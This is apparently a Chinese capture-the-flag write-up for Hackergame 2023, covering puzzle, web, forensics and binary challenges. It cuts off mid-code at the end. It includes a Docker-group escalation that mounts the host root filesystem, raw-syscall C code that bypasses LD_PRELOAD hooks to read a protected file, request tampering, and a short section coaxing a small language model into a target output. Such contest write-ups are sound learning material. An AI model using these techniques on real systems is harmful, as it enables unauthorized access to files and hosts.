<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getFlag</span>(<span class="params">token</span>) &#123;</span><br><span class="line">        <span class="comment">// Generate the flag based on user&#x27;s token</span></span><br><span class="line">        <span class="keyword">let</span> hash = <span class="title class_">CryptoJS</span>.<span class="title class_">SHA256</span>(<span class="string">`dEEper_@nd_d@rKer_<span class="subst">$&#123;token&#125;</span>`</span>).<span class="title function_">toString</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`flag&#123;T1t@n_<span class="subst">$&#123;hash.slice(<span class="number">0</span>, <span class="number">32</span>)&#125;</span>&#125;`</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="title function_">getFlag</span>(<span class="variable language_">localStorage</span>.<span class="property">token</span>)</span><br></pre></td></tr></table></figure>



<h2 id="猫咪小测"><a href="#猫咪小测" class="headerlink" title="猫咪小测"></a>猫咪小测</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1. 想要借阅世界图书出版公司出版的《A Classical Introduction To Modern Number Theory 2nd ed.》，应当前往中国科学技术大学西区图书馆的哪一层？（30 分）</span><br><span class="line">12</span><br><span class="line">暴力破解</span><br><span class="line"></span><br><span class="line">2. 今年 arXiv 网站的天体物理版块上有人发表了一篇关于「可观测宇宙中的鸡的密度上限」的论文，请问论文中作者计算出的鸡密度函数的上限为 10 的多少次方每立方秒差距？（30 分）</span><br><span class="line">23</span><br><span class="line"></span><br><span class="line">https://arxiv.org/abs/2303.17626</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3. 为了支持 TCP BBR 拥塞控制算法，在编译 Linux 内核时应该配置好哪一条内核选项？</span><br><span class="line">CONFIG_TCP_CONG_BBR</span><br><span class="line"></span><br><span class="line">https://github.com/google/bbr/blob/master/Documentation/bbr-quick-start.md</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">4. 🥒🥒🥒：「我……从没觉得写类型标注有意思过」。在一篇论文中，作者给出了能够让 Python 的类型检查器 MyPY mypy 陷入死循环的代码，并证明 Python 的类型检查和停机问题一样困难。请问这篇论文发表在今年的哪个学术会议上？（20 分）</span><br><span class="line">提示：会议的大写英文简称，比如 ISCA、CCS、ICML。</span><br><span class="line"></span><br><span class="line">ECOOP</span><br><span class="line">https://drops.dagstuhl.de/opus/volltexte/2023/18237/pdf/LIPIcs-ECOOP-2023-44.pdf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">好耶学会怎么搜索论文了,Google hacker语法，萃取关键词，然后按时间筛选缩小范围</span><br></pre></td></tr></table></figure>

<img src="/2023/12/28/hackergame2023/1698678184780.png" class="">

<img src="/2023/12/28/hackergame2023/1698678163552.png" class="">

<h2 id="赛博井字棋"><a href="#赛博井字棋" class="headerlink" title="赛博井字棋"></a>赛博井字棋</h2><p>简单玩了一下，发现怎么打都是平局，后面在想能不能在敌方棋子位置下棋，用burp suite发送了一下，发现可以，后端没有判断格子上面是否有棋子，覆盖敌方棋子后就拿到flag了，也可以用两个浏览器来操作</p>
<img src="/2023/12/28/hackergame2023/1698666436520.png" class="">

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;I_can_eat_your_pieces_41065ba433&#125;</span><br></pre></td></tr></table></figure>



<h2 id="组委会模拟器"><a href="#组委会模拟器" class="headerlink" title="组委会模拟器"></a>组委会模拟器</h2><p>这道题消息都是在span标签中的，只需要把span枚举一次，用正则匹配，然后再模拟点击就好了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function findAndClickSpan() &#123;</span><br><span class="line"></span><br><span class="line">  const regex = /hack\[[^\]]*\]/;</span><br><span class="line"></span><br><span class="line">  const spans = document.getElementsByTagName(&#x27;span&#x27;);</span><br><span class="line"></span><br><span class="line">  Array.from(spans).forEach((span) =&gt; &#123;</span><br><span class="line">    if (regex.test(span.textContent)) &#123;</span><br><span class="line">      console.log(&#x27;匹配的span元素:&#x27;, span);</span><br><span class="line"></span><br><span class="line">      span.click();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line">setInterval(findAndClickSpan, 1000);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Web_pr0gra_mm1ng_5a17e089a1_15fun&#125;</span><br></pre></td></tr></table></figure>



<h2 id="虫"><a href="#虫" class="headerlink" title="虫"></a>虫</h2><p>查询了一下无线传输图片的方法，sstv这个协议</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&mid=2247485349&idx=1&sn=7bdfed472158dc2378113361ee9556a6&chksm=fd7112e8ca069bfe1b3da839050f8bebc5c1c166ac82f3326e634779ce1f55f45897968c9922&token=9197758&lang=zh_CN#rd">https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&amp;mid=2247485349&amp;idx=1&amp;sn=7bdfed472158dc2378113361ee9556a6&amp;chksm=fd7112e8ca069bfe1b3da839050f8bebc5c1c166ac82f3326e634779ce1f55f45897968c9922&amp;token=9197758&amp;lang=zh_CN#rd</a></p>
<p>可以用rx sstv这个软件还原图片，需要先装个虚拟声卡然后用rx sstv监听，还原就好了</p>
<img src="/2023/12/28/hackergame2023/1698661030342.png" class="">

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;SSssTV_y0u_W4NNa_HaV3_4_trY&#125;</span><br></pre></td></tr></table></figure>



<h2 id="HTTP-集邮册-差一个"><a href="#HTTP-集邮册-差一个" class="headerlink" title="HTTP 集邮册[差一个]"></a>HTTP 集邮册[差一个]</h2><p>1 获取第一个 flag 需要收集 5 种状态码；</p>
<p>1 200 get请求一个存在的目录 </p>
<p>2 400 请求格式错误 随便乱输入一些东西</p>
<p>3 404 请求一个不存在的目录 </p>
<p>4  405 Bad Request 服务器那边不支持post，直接post</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n\r\n</span><br></pre></td></tr></table></figure>

<p>5 505 http版本不受支持</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/10.1\r\n</span><br><span class="line">Host: example.com\r\n\r\n</span><br></pre></td></tr></table></figure>

<p>2  nginx 返回首行无状态码的响应（不计入收集的状态码中）；</p>
<p>只要不带上http的版本号，服务器那边就不会相应状态相关的信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / \r\n</span><br><span class="line">Host: example.com\r\n\r\n</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d1d you hear the HTTP packet from 1991?&#125;</span><br></pre></td></tr></table></figure>

<p>草，这个flag</p>
<h2 id="Git-Git"><a href="#Git-Git" class="headerlink" title="Git? Git!"></a>Git? Git!</h2><p>不太熟悉git，在搜索后发现，撤销这个操作本身也算是一个提交，也会记录到日志当中，然后我去翻了下项目文件，发现log文件下有一个reset的操作，这里应该是指”撤销”吧，查询了一会资料后发现有一个git show hash的命令，可以查看这个操作具体做了什么事情</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0000000000000000000000000000000000000000 15fd0a13eb46c39f34cfc0dfb4757ad23a23d026 PRO-2684 &lt;54608551+PRO-2684@users.noreply.github.com&gt; 1698306875 +0800	clone: from https://github.com/dair-ai/ML-Course-Notes.git</span><br><span class="line">15fd0a13eb46c39f34cfc0dfb4757ad23a23d026 505e1a3f446c23f31807a117e860f57cb5b5bb79 some_english_postgraduate &lt;some_english_postgraduate@none-exist.com&gt; 1698307060 +0800	commit: Trim trailing spaces</span><br><span class="line">505e1a3f446c23f31807a117e860f57cb5b5bb79 15fd0a13eb46c39f34cfc0dfb4757ad23a23d026 some_english_postgraduate &lt;some_english_postgraduate@none-exist.com&gt; 1698307092 +0800	reset: moving to HEAD~</span><br><span class="line">15fd0a13eb46c39f34cfc0dfb4757ad23a23d026 ea49f0cd3d36edb2965f89581b11151959d20991 some_english_postgraduate &lt;some_english_postgraduate@none-exist.com&gt; 1698307103 +0800	commit: Trim trailing spaces</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git show 505e1a3f446c23f31807a117e860f57cb5b5bb79</span><br></pre></td></tr></table></figure>

<p>后找到撤销的flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;TheRe5_@lwAy5_a_R3GreT_pi1l_1n_G1t&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Docker-for-Everyone"><a href="#Docker-for-Everyone" class="headerlink" title="Docker for Everyone"></a>Docker for Everyone</h2><p>X 是实验室机器的管理员，为了在保证安全的同时让同学们都用上 docker，他把同学的账号加入了 docker 用户组，这样就不需要给同学 sudo 权限了！</p>
<p>但果真如此吗？</p>
<p>去查询了一下后发现，Docker守护程序的访问权限是没有限制的，在docker容器中，可以具有和宿主机相同的权限，那能不能把flag给搬到容器里面，查询了一下后发现有一条挂载数据卷的命令可以实现这个操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/tmp/ -it alpine /bin/sh</span><br></pre></td></tr></table></figure>

<p>cat flag发现有些问题，ls -al看了下是一个软链接，进到这个链接的目录下cat flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/dev/shm # cat flag</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;u5e_r00t1ess_conta1ner_1d94c2e3ce_plz!&#125;</span><br></pre></td></tr></table></figure>



<h2 id="JSON-⊂-YAML"><a href="#JSON-⊂-YAML" class="headerlink" title="JSON ⊂ YAML?"></a>JSON ⊂ YAML?</h2><p>第一问</p>
<p>根据这段话，可以分析出第一问的本质是在问yaml1.1和yaml1.2有什么区别，去学习了一下yaml，和json有些相似，由键值对，列表，还有块三种结构组合成的一种组织数据的语言。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">小 Z 听闻这番言论后当场表示怀疑，立刻说出了一个字符串，JSON 和 YAML 解析出的含义存在差异。小 W 研究了一番才发现，这是因为很多主流的 YAML 库仍然是 YAML 1.1 的，它没有这个性质。他不得不承认：「好吧，这个性质只适用于 YAML 1.2。」</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/21584985/what-valid-json-files-are-not-valid-yaml-1-1-files">https://stackoverflow.com/questions/21584985/what-valid-json-files-are-not-valid-yaml-1-1-files</a></p>
<p>可以参考这篇文章，咱的payload是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123e100000</span><br></pre></td></tr></table></figure>

<p>在yaml1.1中，这个表达式会被解析成科学计数法，json中会被解析成字符串</p>
<p>第二问</p>
<p>搜了半天，终于搜到解决方法了</p>
<img src="/2023/12/28/hackergame2023/1699069440559.png" class="">

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;name&quot;: &quot;John Doe&quot;, &quot;age&quot;: 25, &quot;name&quot;: &quot;Jonathan Doe&quot;&#125;</span><br></pre></td></tr></table></figure>





<h2 id="奶奶的睡前-flag-故事"><a href="#奶奶的睡前-flag-故事" class="headerlink" title="奶奶的睡前 flag 故事"></a>奶奶的睡前 flag 故事</h2><p>咱是笨蛋，去问了newbing好久，后面用010edit打开后发现有两个iend尾，然后联想到系统都没有心思升级，截图，谷歌亲儿子这些关键词，联想到截图漏洞，尾部的像素块没有被截断</p>
<p>去搜索了一下发现这个网站可以还原图片</p>
<p><a target="_blank" rel="noopener" href="https://acropalypse.app/">https://acropalypse.app/</a></p>
<img src="/2023/12/28/hackergame2023/1698743242612.png" class="">

<img src="/2023/12/28/hackergame2023/1698743440800.png" class="">



<h2 id="🪐-高频率星球"><a href="#🪐-高频率星球" class="headerlink" title="🪐 高频率星球"></a>🪐 高频率星球</h2><p><a target="_blank" rel="noopener" href="https://asciinema.org/">asciinema</a></p>
<p>这个软件录制的文件，把录制的文件导出来，发现是一个js的文件，尾部显示运行这个文件能得到flag，但是录制出来的文件有太多终端颜色的符号还有切页符号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asciienma cat xxxx &gt; output.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\033\[[\x30-\x3f]*[\x40-\x7e]</span><br></pre></td></tr></table></figure>

<p>用这个正则清理掉大多数符号后，手工清理了一下，然后拿到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node output.js</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;y0u_cAn_ReSTorE_C0de_fr0m_asc11nema_3db2da1063300e5dabf826e40ffd016101458df23a371&#125;</span><br></pre></td></tr></table></figure>



<h2 id="🪐-低带宽星球-差一个"><a href="#🪐-低带宽星球-差一个" class="headerlink" title="🪐 低带宽星球[差一个]"></a>🪐 低带宽星球[差一个]</h2><p>压缩至 2KiB (2048 字节) 及以下、</p>
<p><a target="_blank" rel="noopener" href="https://github.com/meowtec/Imagine">https://github.com/meowtec/Imagine</a> 这个项目能压缩图片到2kb以下，提交图片后获得flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;A1ot0f_t0015_is_available_to_compre55_PNG&#125;</span><br></pre></td></tr></table></figure>





<h2 id="🪐-流式星球"><a href="#🪐-流式星球" class="headerlink" title="🪐 流式星球"></a>🪐 流式星球</h2><p>这道题的难点有两个，一个是不知道宽高，原始宽高不是10的倍数，以及有个随机数切片，很容易想到质因数分解，然后爆破一百次，把所有可能都试一遍，但是结果都不太行，手工试了一下，找出三个能看出规整图形的尺寸，640 * 620 1280 * 768 2560 * 1440，能看到规整图形了，发现是bang dream it’s mygo的视频，flag在字幕的位置，第二个难点是flag每帧都有随机一行被混淆，然后字体的原因flag看不太清楚，最后把相似的数字枚举了了一遍，才拿到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import cv2</span><br><span class="line">import numpy as np</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def restore_video(input_file, output_folder, frame_width, frame_height):</span><br><span class="line"></span><br><span class="line">    with open(input_file, &quot;rb&quot;) as f:</span><br><span class="line">        buffer = np.fromfile(f, dtype=np.uint8)</span><br><span class="line"></span><br><span class="line">    if len(buffer) % 3 != 0:</span><br><span class="line">        buffer = buffer[:-(len(buffer) % 3)]</span><br><span class="line"></span><br><span class="line">    missing_pixels = (frame_width * frame_height * 3) - (len(buffer) % (frame_width * frame_height * 3))</span><br><span class="line">    buffer = np.concatenate([buffer, np.zeros(missing_pixels, dtype=np.uint8)])</span><br><span class="line"></span><br><span class="line">    frame_count = len(buffer) // (frame_width * frame_height * 3)</span><br><span class="line">    buffer = buffer.reshape((frame_count, frame_height, frame_width, 3))</span><br><span class="line"></span><br><span class="line">    if not os.path.exists(output_folder):</span><br><span class="line">        os.makedirs(output_folder)</span><br><span class="line"></span><br><span class="line">    for i in range(frame_count):</span><br><span class="line">        frame = buffer[i].astype(np.uint8)</span><br><span class="line">        filename = os.path.join(output_folder, f&quot;frame_&#123;i:04d&#125;.png&quot;)</span><br><span class="line">        cv2.imwrite(filename, frame)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    restore_video(&quot;video.bin&quot;, &quot;output_frames&quot;, 640, 620)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;it-could-be-easy-to-restore-video-with-haruhikage-even-without-metadata-0F7968CC&#125;</span><br></pre></td></tr></table></figure>





<h2 id="🪐-小型大语言模型星球"><a href="#🪐-小型大语言模型星球" class="headerlink" title="🪐 小型大语言模型星球"></a>🪐 小型大语言模型星球</h2><p>you are smart</p>
<p>qaq这个模型太笨了，试了好多句子才试出来了</p>
<img src="/2023/12/28/hackergame2023/1699000096270.png" class="">



<h2 id="为什么要打开-flag-😡-差一个"><a href="#为什么要打开-flag-😡-差一个" class="headerlink" title="为什么要打开 &#x2F;flag 😡[差一个]"></a>为什么要打开 &#x2F;flag 😡[差一个]</h2><p>好耶，在hackergame上第一个binary题</p>
<h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p>去搜索了一下什么是ld_preload，ld_preload是linux上的一个环境变量，程序运行的时候根据ld_preload选择使用什么动态链接库</p>
<p>这里使用了&#x2F;stage1.so 这个动态链接库</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">STAGE = os.environ[<span class="string">&quot;STAGE&quot;</span>]</span><br><span class="line"><span class="keyword">assert</span> STAGE <span class="keyword">in</span> (<span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    binary = <span class="built_in">input</span>(<span class="string">&quot;Base64 of binary: &quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/dev/shm/executable&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(base64.b64decode(binary))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/dev/shm/executable&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">if</span> f.read(<span class="number">4</span>) != <span class="string">b&quot;\x7fELF&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;不是 ELF 文件&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">    os.chmod(<span class="string">&quot;/dev/shm/executable&quot;</span>, <span class="number">0o555</span>)</span><br><span class="line">    <span class="keyword">if</span> STAGE == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">        output = subprocess.run(</span><br><span class="line">            [<span class="string">&quot;/dev/shm/executable&quot;</span>],</span><br><span class="line">            stdin=subprocess.DEVNULL,</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">            stderr=subprocess.PIPE,</span><br><span class="line">            user=<span class="string">&quot;nobody&quot;</span>,</span><br><span class="line">            group=<span class="string">&quot;nogroup&quot;</span>,</span><br><span class="line">            env=&#123;</span><br><span class="line">                <span class="string">&quot;LD_PRELOAD&quot;</span>: <span class="string">&quot;/stage1.so&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br></pre></td></tr></table></figure>

<p>大概看了一遍stage1.so，发现和io相关的操作和io不相关但是能间接读flag的函数都被hook了，要么是return一个fake flag要么是 return 0，想了各种的方法，后面突然联想到这些io的操作本质上不就是系统调用吗，那我用内联汇编，去syscall，模拟这些读的操作不就好了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">ssize_t</span> nread;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用系统调用打开文件</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;syscall&quot;</span></span><br><span class="line">        : <span class="string">&quot;=a&quot;</span> (fd)</span><br><span class="line">        : <span class="string">&quot;0&quot;</span>(SYS_open), <span class="string">&quot;D&quot;</span>(<span class="string">&quot;./flag&quot;</span>), <span class="string">&quot;S&quot;</span>(O_RDONLY)</span><br><span class="line">        : <span class="string">&quot;rcx&quot;</span>, <span class="string">&quot;r11&quot;</span>, <span class="string">&quot;memory&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用系统调用读取文件内容</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;syscall&quot;</span></span><br><span class="line">        : <span class="string">&quot;=a&quot;</span> (nread)</span><br><span class="line">        : <span class="string">&quot;0&quot;</span>(SYS_read), <span class="string">&quot;D&quot;</span>(fd), <span class="string">&quot;S&quot;</span>(buf), <span class="string">&quot;d&quot;</span>(<span class="keyword">sizeof</span>(buf))</span><br><span class="line">        : <span class="string">&quot;rcx&quot;</span>, <span class="string">&quot;r11&quot;</span>, <span class="string">&quot;memory&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nread == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">        <span class="keyword">asm</span>(<span class="string">&quot;syscall&quot;</span></span><br><span class="line">            :</span><br><span class="line">        : <span class="string">&quot;a&quot;</span>(SYS_close), <span class="string">&quot;D&quot;</span>(fd)</span><br><span class="line">            : <span class="string">&quot;rcx&quot;</span>, <span class="string">&quot;r11&quot;</span>, <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出文件内容</span></span><br><span class="line">    fwrite(buf, <span class="number">1</span>, nread, <span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用系统调用关闭文件</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;syscall&quot;</span></span><br><span class="line">        :</span><br><span class="line">    : <span class="string">&quot;a&quot;</span>(SYS_close), <span class="string">&quot;D&quot;</span>(fd)</span><br><span class="line">        : <span class="string">&quot;rcx&quot;</span>, <span class="string">&quot;r11&quot;</span>, <span class="string">&quot;memory&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;nande_ld_preload_yattano_a46091dfa1&#125;</span><br></pre></td></tr></table></figure>



<h2 id="惜字如金"><a href="#惜字如金" class="headerlink" title="惜字如金"></a>惜字如金</h2><p>咱是用枚举的方法，枚举一遍</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from itertools import product</span><br><span class="line"></span><br><span class="line"># Constants</span><br><span class="line">ROW1 = &quot;nymeh1niwemflcir&#125;echaet&quot;</span><br><span class="line">ROW2 = &quot;a3g7&#125;kidgojernoetlsup?h&quot;</span><br><span class="line">ROW3 = &quot;ulw!f5soadrhwnrsnstnoeq&quot;</span><br><span class="line">ROW4 = 